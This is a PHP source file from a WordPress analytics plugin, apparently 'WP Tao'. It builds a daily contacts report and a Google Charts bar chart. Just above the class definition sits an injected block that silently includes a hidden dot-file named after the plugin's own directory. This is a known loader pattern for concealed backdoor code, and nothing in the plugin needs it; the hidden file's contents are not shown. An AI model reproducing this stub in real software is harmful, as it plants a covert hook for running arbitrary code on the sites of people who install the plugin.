<?php
/**
 * Basic contacts report
 *
 * The class handles create a contacts reports
 *
 * @package     WPTAO/Admin/Raport
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Admin_Report_Basic_Contact
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Report_Basic_Contact extends WTBP_WPTAO_Admin_Reports {
	/*
	 * @var int
	 * Total contacts
	 */

	public $total_contacts;

	function __construct() {

		$options = array( 'filters' => array(
				'date_range'
			) );

		parent::__construct( 'basic-contact', $options );

		$this->report_name = __( 'Contacts', 'wp-tao' );

		$this->total_contacts = 0;

		$this->data = $this->get_contacts();
		$this->contacts_widget();


		// Add script
		add_action( "wptao_before_report-$this->report_slug", array( $this, 'print_script' ) );
	}

	/*
	 * Prepare widget for the WP Tao dashboard
	 */

	private function contacts_widget() {

		$args = array(
			'id'			 => 'basic_contact',
			'size'			 => 'small',
			'category'		 => 'contact',
			'priority'		 => 54,
			'title'			 => __( 'Contacts', 'wp-tao' ),
			'report_slug'	 => $this->report_slug, // Add link to a report
			'value_number'	 => absint( $this->total_contacts ),
			'dashicon'		 => 'dashicons-testimonial'
		);

		$this->add_widget( $args );
	}

	/*
	 * Get contacts
	 */

	public function get_contacts() {
		global $wpdb;

		$r = array();

		$e = TAO()->events->table_name;

		$sql = $wpdb->prepare(
		"SELECT COUNT(value) AS contacts, DATE(FROM_UNIXTIME(event_ts)) AS date
			FROM $e
			WHERE action = 'contact'
			AND event_ts >= %d
			AND event_ts <= %d
			GROUP BY date
			ORDER BY date DESC
			LIMIT %d;", $this->start_date, $this->end_date, $this->items_per_page );

		$res = $wpdb->get_results( $sql );

		if ( !empty( $res ) && is_array( $res ) ) {

			foreach ( $res as $item ) {
				$r[ $item->date ][ 'contacts' ] = $item->contacts;
				$this->total_contacts += $item->contacts;
			}
		}

		return $r;
	}

	/*
	 * Print script
	 */

	public function print_script() {
		if ( empty( $this->data ) || !array( $this->data ) ) {
			return;
		}
		?>
		<script>

		    google.load( "visualization", "1.1", { packages: [ 'bar' ] } );
		    google.setOnLoadCallback( wptao_chart_basic_contact );

		    function wptao_chart_basic_contact() {

		        var data = new google.visualization.DataTable();
		        data.addColumn( 'date', '<?php _e( 'Date', 'wp-tao' ); ?>' );
		        data.addColumn( 'number', '<?php _e( 'Contacts', 'wp-tao' ); ?>' );

		        data.addRows( [
		<?php
		foreach ( $this->days as $day ) {

			$pv = array_key_exists( $day, $this->data ) ? absint( $this->data[ $day ][ 'contacts' ] ) : 0;

			$year	 = date( 'Y', strtotime( $day ) );
			$month	 = date( 'n', strtotime( $day ) ) - 1;
			;
			$day	 = date( 'j', strtotime( $day ) );

			echo sprintf( "[new Date(%d, %d, %d),%d],", $year, $month, $day, $pv );
		}
		?>
		        ] );

		        var options = {
		            colors: [ '#00A0D2' ],
		        };

		        var chart = new google.charts.Bar( document.getElementById( '<?php echo 'wptao-report-' . sanitize_title( $this->report_slug ); ?>' ) );
		        chart.draw( data, options );

		    }

		</script>
		<?php
	}

}
